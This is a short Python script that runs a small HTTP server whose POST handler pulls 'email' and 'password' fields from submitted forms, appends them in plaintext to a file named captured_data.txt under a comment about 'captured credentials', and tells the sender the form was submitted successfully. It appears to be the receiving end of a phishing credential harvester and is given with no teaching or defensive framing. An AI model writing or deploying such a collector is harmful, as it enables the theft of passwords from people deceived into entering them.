from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Read the content length to know how much data to read
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Parse the form data using urllib.parse
        form_data = parse_qs(post_data.decode('utf-8'))

        # Extract the email and password fields
        email = form_data.get('email', [None])[0]
        password = form_data.get('password', [None])[0]

        # Log the captured credentials to a text file
        with open("captured_data.txt", "a") as f:
            f.write(f"Email: {email}\nPassword: {password}\n\n")

        # Respond with a success message
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Form submitted successfully!")

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8081):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server running on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
